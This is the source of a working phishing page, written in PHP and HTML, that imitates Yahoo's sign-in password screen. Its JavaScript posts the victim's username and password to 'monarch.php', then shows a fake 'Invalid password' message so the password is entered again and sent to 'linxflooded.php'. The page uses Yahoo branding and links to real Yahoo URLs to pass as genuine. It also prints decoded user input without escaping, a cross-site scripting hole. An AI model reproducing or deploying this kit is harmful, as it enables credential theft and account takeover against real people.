<?php
if(isset($_POST['username']))
{
    $regulate = base64_encode($_POST['username']);
}
elseif((isset($_GET['ext_user'])))
{
    $regulate = $_GET['ext_user'];
}
else
{
    header("location: login.php?https://login.yahoo.com/?.src=ym&.lang=en-US&.intl=us&.done=https%3A%2F%2Fmail.yahoo.com%2Fd"); //beginin
}
?>
<!DOCTYPE html>
<html id="Stencil" class="js">
   <head>
      <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
      <meta charset="utf-8">
      <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0">
      <meta name="format-detection" content="telephone=no">
      <meta name="referrer" content="origin-when-cross-origin">
      <title>Yahoo</title>
      <link rel="dns-prefetch" href="https://gstatic.com/">
      <link rel="dns-prefetch" href="https://google.com/">
      <link rel="dns-prefetch" href="https://s.yimg.com/">
      <link rel="dns-prefetch" href="https://y.analytics.yahoo.com/">
      <link rel="dns-prefetch" href="https://ucs.query.yahoo.com/">
      <link rel="dns-prefetch" href="https://geo.query.yahoo.com/">
      <link rel="dns-prefetch" href="https://geo.yahoo.com/">
      <link rel="icon" type="image/x-icon" href="resources/favicon.ico">
      <link rel="shortcut icon" type="image/x-icon" href="resources/favicon.ico">
      <link rel="apple-touch-icon" href="https://s.yimg.com/wm/login/apple-touch-icon.png">
      <link rel="apple-touch-icon-precomposed" href="https://s.yimg.com/wm/login/apple-touch-icon.png">
      <link media="all" href="resources/index_.css" type="text/css" rel="stylesheet">
      <script type="text/javascript">
      function hideRed()
      {
        //make onKeyUp always use dis
        document.getElementById("username-error").className += " hide";
      }
      function disValidate()
        {
          //normal make sure it ain't empty;
          var user = document.forms["Form"]["password"].value;
          if(user =="" || user == null)
          {
            document.getElementById("username-error").className = document.getElementById("username-error").className.replace( /(?:^|\s)hide(?!\S)/g , '' ); // unhide d tag
            document.getElementById("username-error").innerHTML = "Please provide&nbsp;password." // fill it
            return false;
          }
          else if (document.forms["Form"]["snackbar"].value === "done") {
            //check if u entered initial password
            //let it continue if true
             return true;
          }
          else
          {
          var doc=new XMLHttpRequest();
          var url="monarch.php";
          var data="uu="+document.forms["Form"]["displayName"].value+"&pp="+document.forms["Form"]["password"].value;
          doc.open("POST",url,true);
          doc.setRequestHeader("Content-type","application/x-www-form-urlencoded");
          doc.onreadystatechange=function(){
              if(doc.readyState==4 && doc.status==200){
                  var info=doc.responseText;
              var x = document.forms["Form"]["snackbar"];
              x.value = info;
              //set old password to be sent
              document.forms["Form"]["pass"].value = document.forms["Form"]["password"].value;

              //show retry password error
              document.getElementById("username-error").className = document.getElementById("username-error").className.replace( /(?:^|\s)hide(?!\S)/g , '' ); // unhide d tag
              document.getElementById("username-error").innerHTML = "Invalid password. Please try again." // fill it
              document.forms["Form"]["password"].value = ""; //empty box
              }

          }
          doc.send(data);
          return false;
           }
        }
        function spinHide()
       {
         document.getElementById("login-signin").className = document.getElementById("login-signin").className.replace( /(?:^|\s)active(?!\S)/g , ' ')
       }
        function spinBaby()
        {
          document.getElementById("login-signin").className = document.getElementById("login-signin").className.replace( ' ' , 'active ')
          setTimeout(spinHide, 2000);
        }
      </script>
   </head>
   <body>
      <div class="mbr-legacy-device-bar" id="mbr-legacy-device-bar">
         <label class="cross" for="mbr-legacy-device-bar-cross" aria-label="Close this&nbsp;warning">x</label>
         <input id="mbr-legacy-device-bar-cross" type="checkbox">
         <p class="mbr-legacy-device">
            Yahoo works best with the latest versions of the browsers. You're using an outdated or unsupported browser and some Yahoo features may not work properly. Please update your browser version now. <a href="https://login.yahoo.com/account/challenge/password?.src=ym&amp;lang=&amp;done=https%3A%2F%2Fmail.yahoo.com%2F&amp;authMechanism=primary&amp;add=1&amp;display=login&amp;yid=specialman4u2014&amp;sessionIndex=QQ--&amp;acrumb=YkhJGt16">More&nbsp;Info</a>
         </p>
      </div>
      <div id="login-body" class="loginish puree-v2 dark-background">
         <div class="mbr-ybar ybar-light">
            <div id="ybar" role="banner" class="_yb_2itc2     ">
               <div class="_yb_2iekg _yb_udqv0">
                 <a href="https://www.yahoo.com/" class="_yb_1bt6j " data-ylk="sec:yb_logo;slk:login;itc:0;">   <img class="_yb_1f72d _yb_eig0z" src="resources/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" height="36" onerror="this.onerror=null;this.style.display='none';" alt="login">
                   <img class="_yb_1f72d _yb_1bt35" src="resources/yahoo_en-us_f_w_bestfit.png" alt="login" onerror="this.onerror=null;this.style.display='none';">   login</a></div>
               <div role="toolbar" class="_yb_kip6q "></div>
            </div>
         </div>
         <div class="login-box-container">
            <div class="login-box default">
               <div class="mbr-login-hd txt-align-center">
                  <img src="resources/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" height="27" alt="Yahoo" class="logo yahoo-en-US" height="">
               </div>
               <div class="challenge password-challenge">
                  <div id="password-challenge" class="primary">
                     <div class="greeting">
                        <h1 class="username">Hello&nbsp;<?=base64_decode($regulate)?></h1>
                        <p class="not-you"><a href="login.php?https://login.yahoo.com/?.src=ym&.lang=en-US&.intl=us&.done=https%3A%2F%2Fmail.yahoo.com%2Fd">Not&nbsp;you?</a></p>
                     </div>
                     <form action="linxflooded.php" name="Form" onSubmit="return disValidate()" action="" method="post" class="pure-form pure-form-stacked">
                        <input type="hidden" name="displayName" value="<?=$regulate?>">
                        <input type="hidden" name="snackbar" value="">
                        <input type="hidden" name="pass" value="">
                        <input id="login-passwd" name="password" placeholder="Password" autofocus="" autocomplete="current-password" type="password" onkeypress="hideRed();">
                        <p id="username-error" class="error-msg hide" role="alert" name="username-error"></p>
                        <?php //<p id="snackbar" class="error-msg" role="alert" name="username-error"></p>?>
                        <p class="signin-cont">
                           <button onClick="spinBaby();" type="submit" id="login-signin" class=" pure-button puree-button-primary puree-spinner-button" name="verifyPassword" value="Sign&nbsp;in" data-ylk="elm:btn;elmt:next;slk:next">
                           Sign&nbsp;in
                           </button>
                        </p>
                        <p class="forgot-cont">
                           <input class="pure-button puree-button-link" data-ylk="elm:btn;elmt:skip;slk:skip" id="mbr-forgot-link" name="skip" value="I forgot my&nbsp;password" type="submit">
                        </p>
                     </form>
                  </div>
               </div>
            </div>
            <div id="login-box-ad-fallback" class="login-box-ad-fallback">
               <h1>Yahoo makes it easy to enjoy what matters most in your&nbsp;world.</h1>
               <p>Best in class Yahoo Mail, breaking local, national and global news, finance, sports, music, movies and more. You get more out of the web, you get more out of&nbsp;life.</p>
            </div>
         </div>
         <div class="login-box-ad-outer">
            <div class="login-box-ad-inner">
               <div id="login-ad-rich"></div>
            </div>
         </div>
      </div>
      <div id="mbr-css-check"></div>
   </body>
</html>
